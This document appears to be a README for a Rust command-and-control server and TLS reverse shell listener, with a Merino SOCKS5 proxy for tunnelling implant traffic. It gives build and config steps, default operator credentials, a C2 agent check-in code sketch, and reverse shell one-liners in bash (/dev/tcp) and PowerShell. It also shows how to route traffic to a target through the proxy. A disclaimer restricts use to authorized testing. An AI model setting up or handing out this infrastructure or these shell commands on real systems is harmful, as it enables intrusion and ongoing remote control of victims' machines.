# C2 Server & Reverse Shell Infrastructure

A complete Command & Control (C2) server and reverse shell server with TLS encryption and SOCKS5 proxy support using Merino.

## Features

- **C2 Server**: Agent management, task distribution, encrypted communications
- **Reverse Shell Server**: TLS-encrypted reverse shell listener
- **TLS Support**: Auto-generating self-signed certificates via certbot
- **SOCKS5 Proxy**: Integrated Merino proxy for traffic tunneling
- **CSV Authentication**: Simple username/password authentication for SOCKS5

## Architecture

```
┌─────────────────┐         ┌──────────────────┐         ┌─────────────┐
│   C2 Agents     │ ◄─TLS──►│   C2 Server      │ ◄──────►│   Merino    │
│   (Implants)    │         │   Port 8443      │         │  SOCKS5     │
└─────────────────┘         └──────────────────┘         │ Port 1080   │
                                                          └─────────────┘
┌─────────────────┐         ┌──────────────────┐         ┌─────────────┐
│  Reverse Shell  │ ◄─TLS──►│   Shell Server   │ ◄──────►│   Merino    │
│   Implants      │         │   Port 4444      │         │  SOCKS5     │
└─────────────────┘         └──────────────────┘         │ Port 1081   │
                                                          └─────────────┘
```

## Installation

### Prerequisites

1. Install Rust (if not already installed):
   ```bash
   curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
   ```

2. Install Merino SOCKS5 proxy:
   ```bash
   cargo install merino
   ```

### Build

```bash
cd crates/c2-server
cargo build --release
```

Binaries will be at:
- `target/release/c2-server.exe`
- `target/release/shell-server.exe`

## Configuration

### Generate Default Configurations

```bash
# Generate C2 server config
cargo run --bin c2-server -- --generate-config

# Generate shell server config
cargo run --bin shell-server -- --generate-config
```

### Configuration Files

#### C2 Server (`configs/c2-server.toml`)

```toml
[server]
bind_address = "0.0.0.0"
port = 8443
max_clients = 100
timeout_seconds = 300

[tls]
enabled = true
cert_path = "certs/c2-server.crt"
key_path = "certs/c2-server.key"
auto_generate = true
domain = "c2.local"

[security]
auth_token = "CHANGE-ME-SECURE-TOKEN-HERE"
encryption_key = "CHANGE-ME-BASE64-KEY-HERE"
allowed_ips = ["0.0.0.0/0"]

[socks5]
enabled = true
ip = "127.0.0.1"
port = 1080
users_csv = "configs/merino-users.csv"
no_auth = false
```

#### Reverse Shell Server (`configs/reverse-shell.toml`)

```toml
[server]
bind_address = "0.0.0.0"
port = 4444

[shell]
command = "powershell.exe"  # Windows
# command = "/bin/bash"      # Linux/Mac
args = ["-NoProfile", "-NonInteractive"]

[socks5]
enabled = true
port = 1081
users_csv = "configs/merino-users.csv"
```

#### SOCKS5 Users (`configs/merino-users.csv`)

```csv
username,password
c2agent,Ch@ng3M3!Str0ng
operator1,S3cur3P@ssw0rd!
admin,Adm1n!P@ssw0rd
```

**⚠ CRITICAL: Change these default passwords!**

## Usage

### Start C2 Server

```bash
# Using default config
cargo run --bin c2-server

# Using custom config
cargo run --bin c2-server -- --config /path/to/config.toml
```

### Start Reverse Shell Server

```bash
# Using default config
cargo run --bin shell-server

# Using custom config
cargo run --bin shell-server -- --config /path/to/config.toml
```

### What Happens on Startup

1. **Certificate Generation**: If TLS is enabled and certs don't exist, self-signed certs are auto-generated
2. **Merino Launch**: If SOCKS5 is enabled, merino process is spawned with CSV auth
3. **Server Binding**: Main server binds to configured address/port
4. **Ready**: Server awaits connections

## SOCKS5 Proxy Usage

### Connect Through Merino

Agents/implants can route traffic through the SOCKS5 proxy:

```bash
# Example using curl through SOCKS5
curl --socks5 127.0.0.1:1080 --socks5-user c2agent:Ch@ng3M3!Str0ng https://target.com

# Example using proxychains
# Edit /etc/proxychains.conf:
# socks5 127.0.0.1 1080 c2agent Ch@ng3M3!Str0ng
proxychains curl https://target.com
```

### Manage SOCKS5 Users

Edit `configs/merino-users.csv`:

```csv
username,password
newuser,SecureP@ss123
anotheruser,An0th3rP@ss!
```

Restart the server to apply changes.

## Connecting to Servers

### C2 Agent Example (Conceptual)

```rust
use tokio::net::TcpStream;
use tokio_rustls::TlsConnector;

// Connect to C2 server
let stream = TcpStream::connect("c2-server:8443").await?;

// Wrap in TLS
let connector = TlsConnector::from(/* tls config */);
let tls_stream = connector.connect(domain, stream).await?;

// Send checkin message
let message = C2Message {
    agent_id: Uuid::new_v4(),
    message_type: MessageType::Checkin,
    payload: serde_json::to_string(&agent_info)?,
};

// Send JSON message
tls_stream.write_all(&serde_json::to_vec(&message)?).await?;
```

### Reverse Shell Connection

```bash
# Linux/Mac
bash -i >& /dev/tcp/shell-server/4444 0>&1

# PowerShell
$client = New-Object System.Net.Sockets.TCPClient('shell-server',4444);
$stream = $client.GetStream();
# ... encryption/TLS handling ...
```

## Security Considerations

⚠️ **FOR EDUCATIONAL/AUTHORIZED TESTING ONLY**

- Only deploy on networks you own or have permission to test
- Change all default credentials immediately
- Use strong, unique passwords
- Consider using client certificates for TLS mutual auth
- Monitor logs for unauthorized access attempts
- Comply with all applicable laws and regulations

### Hardening

1. **Firewall Rules**: Restrict access by IP
2. **Strong Auth**: Generate random auth tokens:
   ```bash
   openssl rand -base64 32
   ```
3. **Rate Limiting**: Enable in config to prevent DoS
4. **Logging**: Monitor all connections and commands
5. **Encryption**: Always use TLS in production

## Logs

Logs are written to:
- `logs/c2.log` - C2 server logs
- `logs/shell.log` - Shell server logs

Configure log level in TOML:
```toml
[logging]
level = "debug"  # trace, debug, info, warn, error
file = "logs/custom.log"
console = true
```

## Troubleshooting

### Merino not found

```bash
cargo install merino
# or
export PATH="$HOME/.cargo/bin:$PATH"
```

### Certificate errors

Delete old certs and restart:
```bash
rm -rf certs/
cargo run --bin c2-server
```

### Permission denied on ports

Use ports > 1024 or run with elevated privileges:
```bash
# Windows (Admin PowerShell)
cargo run --bin c2-server

# Linux
sudo cargo run --bin c2-server
```

### SOCKS5 connection refused

Check merino is running:
```bash
ps aux | grep merino
netstat -an | grep 1080
```

## Development

### Run Tests

```bash
cargo test
```

### Build Documentation

```bash
cargo doc --open
```

## License

MIT OR Apache-2.0

## Disclaimer

This software is provided for educational and authorized security testing purposes only. Unauthorized access to computer systems is illegal. The authors assume no liability for misuse.
